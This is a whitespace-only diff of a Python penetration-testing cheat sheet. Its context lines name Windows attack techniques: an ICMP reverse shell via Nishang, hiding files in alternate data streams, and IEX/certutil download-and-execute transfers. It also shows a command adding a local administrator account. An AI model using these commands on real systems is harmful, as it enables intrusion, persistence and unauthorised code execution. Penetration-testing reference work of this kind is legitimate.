@@ -1,13 +1,13 @@
 class Cheat:
-    def __init__(self, name):
-        self.name = name
-        self.category = None
-        self.output = None
-        self.addToList()
+	def __init__(self, name):
+		self.name = name
+		self.category = None
+		self.output = None
+		self.addToList()
 
-    def addToList(self):
-        global cheatList
-        cheatList.append(self)
+	def addToList(self):
+		global cheatList
+		cheatList.append(self)
 
 
 cheatList = []
@@ -30,7 +30,7 @@ Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
 ######################################
 
 icmp_reverse_shell_windows = Cheat(
-    "ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
+	"ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
 )
 icmp_reverse_shell_windows.category = "Windows"
 icmp_reverse_shell_windows.output = """[*] Reverse Shell when TCP and UDP connection are blocked by Firewall rules.
@@ -83,7 +83,7 @@ cacls C:\PATH\File.ext
 ######################################
 
 alternative_data_streams = Cheat(
-    "Alternate Data Streams (MetaData), hide file in a file"
+	"Alternate Data Streams (MetaData), hide file in a file"
 )
 alternative_data_streams.category = "Windows"
 alternative_data_streams.output = """[*] Check for hide data in a file (like stenography for images)
@@ -174,7 +174,7 @@ sudo restart ipsec
 ######################################
 
 file_transfere_windows_iwr = Cheat(
-    "File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
+	"File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
 )
 file_transfere_windows_iwr.category = "Windows"
 file_transfere_windows_iwr.output = """[*] Simple file transfere for Windows with PowerShell
@@ -209,7 +209,7 @@ net localgroup Administrators javali /add
 ######################################
 
 file_transfere_windows_smbserver = Cheat(
-    "File Transfere Windows - SmbServer.py (Impacket)"
+	"File Transfere Windows - SmbServer.py (Impacket)"
 )
 file_transfere_windows_smbserver.category = "Windows"
 file_transfere_windows_smbserver.output = """[*] Create Shared Folder by the Internet with SmbServer.py (Impacket)
